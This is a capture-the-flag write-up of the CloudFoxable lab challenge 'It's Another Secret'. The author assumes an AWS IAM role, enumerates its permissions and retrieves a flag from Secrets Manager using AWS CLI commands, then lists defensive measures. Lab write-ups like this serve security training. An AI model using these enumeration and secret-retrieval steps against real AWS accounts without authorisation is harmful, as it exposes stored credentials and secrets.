# CloudFoxable Challenge: "It's Another Secret"

## Overview

This write-up documents the steps taken to complete the "It's Another Secret" challenge as part of the CloudFoxable Lab. The objective of this challenge was to:

Assume the Ertz IAM role to simulate a privilege escalation scenario.
Enumerate AWS permissions and resources available to the assumed role.
Identify and retrieve the its-another-secret flag stored in AWS Secrets Manager.
Understand IAM role-based access control (RBAC) and privilege escalation risks in AWS.

## Challenge Setup

### Prerequisites
Before starting the challenge, the following tools and configurations were required:

AWS CLI installed and configured with the cloudfoxable profile.
CloudFox installed and properly set up for enumeration.
Go environment installed (for building and running CloudFox).
IAM credentials that allow assuming the Ertz role.

### CloudFoxable Deployment
Since the challenge environment was already deployed, no additional Terraform provisioning was required. However, if redeployment was necessary, the following command would apply the required infrastructure:

terraform apply

## Challenge Walkthrough

### Step 1: Assuming the Ertz Role
To avoid manually exporting credentials, I added the following configuration to ~/.aws/config:

[profile ertz]
region = us-west-2
role_arn = arn:aws:iam::ACCOUNT_ID:role/Ertz
source_profile = cloudfoxable
Then, I verified the role assumption:

aws --profile ertz sts get-caller-identity
This confirmed that I had successfully assumed the Ertz role:

{
    "UserId": " ",
    "Account": " ",
    "Arn": " "
}

### Step 2: Enumerating Permissions
Once I had assumed the role, I needed to determine what actions I could perform. I started by listing attached policies:

aws --profile ertz iam list-attached-user-policies --user-name Ertz
Since permissions might have been assigned through a group, I also checked for group-based policies:

aws --profile ertz iam list-groups-for-user --user-name Ertz
aws --profile ertz iam list-group-policies --group-name <group-name>
From the results, I found that Ertz had Secrets Manager permissions, which indicated that the flag might be stored there.

### Step 3: Searching for the Flag
Since the challenge name included "Secret", I focused on AWS Secrets Manager.

I listed all available secrets:

aws --profile ertz secretsmanager list-secrets
The output revealed a secret named its-another-secret:

{
    "Name": "its-another-secret",
    "Arn": "arn:aws:secretsmanager:us-west-2:ACCOUNT_ID:secret:its-another-secret"
}

### Step 4: Retrieving the Secret
To retrieve the flag, I used:

aws --profile ertz secretsmanager get-secret-value --secret-id its-another-secret
This returned:

{
    "SecretString": "FLAG{this_is_the_secret_flag}"
}
Flag retrieved: FLAG{this_is_the_secret_flag}

## Challenges Faced

1. Incorrect IAM Role Assumption
Initially, I mistyped the ACCOUNT_ID, which resulted in an assume-role failure.
Fixed by ensuring the correct role ARN was used.
2. Permission Denied on AWS CLI Commands
Some IAM and S3 enumeration commands returned AccessDenied errors.
Solved by checking ertz's permissions and focusing only on accessible services like Secrets Manager.
3. Identifying the Location of the Secret
The flag could have been in S3, SSM Parameter Store, or Secrets Manager.
By analyzing permissions, I found that Secrets Manager was accessible, which led me to the correct location.

## Blue Team Perspective: Defensive Measures

From a defensive security standpoint, organizations should implement the following best practices to prevent unauthorized access to secrets:

Principle of Least Privilege (PoLP): Restrict IAM roles to the minimum permissions necessary.
CloudTrail Logging: Enable detailed logging for AWS Secrets Manager access.
Secret Rotation: Regularly rotate secrets to minimize exposure risks.
IAM Role Restrictions: Limit role assumptions to trusted users and enforce MFA.

## Conclusion

This challenge provided hands-on experience with AWS privilege escalation, resource enumeration, and secrets retrieval.

Key takeaways:
Understanding AWS IAM role assumptions
Privilege escalation techniques using assumed roles
AWS resource enumeration using AWS CLI and CloudFox
Extracting sensitive secrets from AWS Secrets Manager

This exercise demonstrated the importance of IAM role security and proper access control in AWS environments. 🚀

## Commands Used

Verify AWS Profile
aws --profile cloudfoxable sts get-caller-identity
Assume the Ertz Role
aws --profile cloudfoxable sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/Ertz --role-session-name Ertz
List Available Secrets
aws --profile ertz secretsmanager list-secrets
Retrieve the Secret
aws --profile ertz secretsmanager get-secret-value --secret-id its-another-secret
